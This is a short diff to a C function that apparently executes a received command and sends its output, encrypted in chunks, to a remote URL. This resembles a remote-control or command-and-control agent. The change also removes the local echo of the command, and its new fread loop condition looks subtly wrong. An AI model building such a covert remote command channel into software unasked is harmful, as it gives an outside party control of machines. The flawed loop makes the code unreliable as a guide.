@@ -63,17 +63,18 @@ static void handle_message(struct message_details *message_details)
       return;
     }
 
-    printf("%s\n", command);
     // collect command result and send the result
-    while (fread(cmd_output, sizeof(cmd_output), 1, cmd) <= 0)
+    while (fread(cmd_output, sizeof(cmd_output) - 1, 1, cmd) >= 0)
     {
       if (ferror(cmd) != 0)
       {
         log_error("fread");
         break;
       }
+
       randombytes_buf(nonce, sizeof(nonce));
 
+      cmd_output[sizeof(cmd_output) - 1] = '\0';
       if ((ciphertext_len = encrypt(ciphertext, (unsigned char *)cmd_output, sizeof(cmd_output), nonce, PRIVATE_KEY_PATH, PUBLIC_KEY_PATH)) < 0)
       {
         log_error("encrypt");
@@ -90,7 +91,8 @@ static void handle_message(struct message_details *message_details)
 
       // TODO: fix to use dynamic IP
       send_request((unsigned char *)res_message, CLIENT_URL);
-
+      
+      bzero(cmd_output, sizeof(cmd_output));
       // break when the last segment is read
       if (feof(cmd) != 0)
         break;
